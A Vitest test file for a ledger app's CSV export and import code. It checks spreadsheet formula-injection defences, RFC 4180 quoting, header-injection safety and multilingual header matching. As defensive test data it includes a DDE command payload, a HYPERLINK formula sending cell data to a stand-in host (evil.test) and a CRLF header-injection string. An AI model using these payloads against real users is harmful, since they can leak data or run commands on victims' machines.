import { describe, expect, it } from 'vitest';
import { attachment, csvCell, parseDelimited, parseTable, toCsv, UTF8_BOM } from '@/lib/csv';

describe('csv', () => {
  describe('formula injection', () => {
    // The hazard is not theoretical and not about commas. A cell beginning
    // with one of these is executed by Excel, Sheets and LibreOffice, and on a
    // ledger the attacker's input channel is "type an entry description".
    it.each(['=1+1', '+1', '-1+1', "-2+3+cmd|' /C calc'!A0", '@SUM(A1)', '\tx', '\rx'])(
      'neutralises %j',
      (payload) => {
        expect(csvCell(payload).replace(/^"/u, '')).toMatch(/^'/u);
      },
    );

    // A ledger exports negative numbers on every other row. Prefixed, they
    // import as text — which a spreadsheet's SUM skips without a word — and a
    // bare number is not a formula however it starts: `-1` evaluates to -1.
    it.each(['-1', '-918000000', '-1234.56', -42])('leaves the number %j a number', (value) => {
      expect(csvCell(value)).toBe(String(value));
    });

    it('neutralises the exfiltration payload specifically', () => {
      const attack = '=HYPERLINK("http://evil.test/?"&A1,"Click me")';
      const cell = csvCell(attack);
      // Quoted *and* prefixed: quoting alone still leaves a formula, because
      // the quotes are consumed by the CSV parser before the formula parser
      // ever sees the text.
      expect(cell.startsWith(`"'=`)).toBe(true);
    });

    it('leaves ordinary text alone', () => {
      expect(csvCell('Coffee beans')).toBe('Coffee beans');
      expect(csvCell('1234.56')).toBe('1234.56');
    });
  });

  describe('RFC 4180', () => {
    it('quotes fields containing a comma, quote or newline', () => {
      expect(csvCell('a,b')).toBe('"a,b"');
      expect(csvCell('say "hi"')).toBe('"say ""hi"""');
      expect(csvCell('line\nbreak')).toBe('"line\nbreak"');
    });

    it('writes an empty cell for null and undefined rather than the words', () => {
      expect(csvCell(null)).toBe('');
      expect(csvCell(undefined)).toBe('');
    });

    it('separates records with CRLF', () => {
      const csv = toCsv(['a', 'b'], [['1', '2']]);
      expect(csv).toBe(`${UTF8_BOM}a,b\r\n1,2\r\n`);
    });

    it('opens with a UTF-8 byte-order mark', () => {
      // Without it Excel on Windows guesses the system codepage and every
      // non-ASCII account name arrives as mojibake.
      expect(toCsv(['name'], [['Café']]).startsWith(UTF8_BOM)).toBe(true);
    });
  });

  describe('content-disposition', () => {
    it('carries both an ASCII and an encoded filename', () => {
      const header = attachment('Café statement.csv');
      expect(header).toContain('filename="Caf__statement.csv"');
      expect(header).toContain("filename*=UTF-8''Caf%C3%A9%20statement.csv");
    });

    it('cannot be used to inject a second header', () => {
      // A name is user data — an account is named by whoever opened it.
      const header = attachment('evil"\r\nSet-Cookie: a=b.csv');
      expect(header).not.toContain('\r');
      expect(header).not.toContain('\n');
      expect(header.match(/"/gu)).toHaveLength(2);
    });
  });
});

describe('reading a spreadsheet back', () => {
  it('reads a paste straight out of Excel, which is tab-separated', () => {
    // The single most common case and the one a comma-splitting parser turns
    // into one column with a very confusing error message.
    const pasted = 'sku\tquantity\tcost\nPAV-600\t1000\t40000.00';
    expect(parseTable(pasted)).toEqual({
      headers: ['sku', 'quantity', 'cost'],
      rows: [['PAV-600', '1000', '40000.00']],
    });
  });

  it('reads a semicolon file, which is what European Excel exports', () => {
    // The comma is the decimal mark in Vietnamese, German and French locales,
    // so Excel uses a semicolon as the list separator. This is a legitimate
    // CSV that a comma parser reads as gibberish.
    const exported = 'sku;quantity;cost\nPAV-600;1000;40000,00';
    expect(parseDelimited(exported)).toEqual([
      ['sku', 'quantity', 'cost'],
      ['PAV-600', '1000', '40000,00'],
    ]);
  });

  it('keeps a comma inside a quoted field', () => {
    expect(parseDelimited('a,b\n"Hamburg, Germany",2')).toEqual([
      ['a', 'b'],
      ['Hamburg, Germany', '2'],
    ]);
  });

  it('keeps a newline inside a quoted field', () => {
    // The reason this cannot be a regular expression: the document cannot be
    // split into lines before it is parsed. A shipping address has newlines.
    expect(parseDelimited('ref,address\nINV-1,"12 Quarry Rd\nBình Định"')).toEqual([
      ['ref', 'address'],
      ['INV-1', '12 Quarry Rd\nBình Định'],
    ]);
  });

  it('reads a doubled quote as one literal quote', () => {
    expect(parseDelimited('a\n"He said ""no"""')).toEqual([['a'], ['He said "no"']]);
  });

  it('survives Windows line endings and a byte-order mark', () => {
    expect(parseDelimited(`${UTF8_BOM}a,b\r\n1,2\r\n`)).toEqual([
      ['a', 'b'],
      ['1', '2'],
    ]);
  });

  it('drops blank lines rather than producing empty rows', () => {
    expect(parseDelimited('a,b\n1,2\n\n3,4\n')).toEqual([
      ['a', 'b'],
      ['1', '2'],
      ['3', '4'],
    ]);
  });

  it('matches headers however they were typed', () => {
    const { headers } = parseTable('Unit Cost,SKU,"Date  Received"\n1,2,3');
    expect(headers).toEqual(['unitcost', 'sku', 'datereceived']);
  });

  it('round-trips what the export side writes', () => {
    // The two halves of this module have to agree, including about the cell
    // that had to be defused on the way out.
    const written = toCsv(['description', 'amount'], [['=SUM(A1:A9), and a "quote"', '10.00']]);
    const [, first] = parseDelimited(written.replace(UTF8_BOM, ''));
    // The leading apostrophe is deliberate and survives: it is what stops the
    // spreadsheet evaluating the cell, and it is visible on the way back in.
    expect(first?.[0]).toBe('\'=SUM(A1:A9), and a "quote"');
    expect(first?.[1]).toBe('10.00');
  });
});

describe('header matching across languages', () => {
  it('strips accents rather than the letters carrying them', () => {
    // `Mã hàng` is "item code" and `Số lượng` is "quantity". Deleting the
    // accented letters gives `mhng` and `slng`, which match nothing and read
    // to the person who typed them as the importer not supporting Vietnamese.
    const { headers } = parseTable('Mã hàng;Số lượng;Thành tiền;Ngày\nA;1;2;3');
    expect(headers).toEqual(['mahang', 'soluong', 'thanhtien', 'ngay']);
  });

  it('maps đ, which is a letter and not a d with a mark on it', () => {
    // NFD does not decompose it, so it survives the diacritic strip and then
    // falls foul of the a–z filter. `Đơn vị` would become `nvi`.
    expect(parseTable('Đơn vị\nm2').headers).toEqual(['donvi']);
  });

  it('keeps Japanese headers, which an a-z filter erases entirely', () => {
    // 品目コード normalises to the empty string under `[^a-z0-9]`, and the
    // importer then tells a Japanese user their file has no columns. The
    // three Japanese scripts are kept alongside the Latin alphabet.
    expect(parseTable('品目コード,数量,金額,日付\nA,1,2,3').headers).toEqual([
      '品目コード',
      '数量',
      '金額',
      '日付',
    ]);
  });

  it('still drops punctuation around a Japanese header', () => {
    expect(parseTable('「数量」 ,金額（円）\n1,2').headers).toEqual(['数量', '金額円']);
  });
});
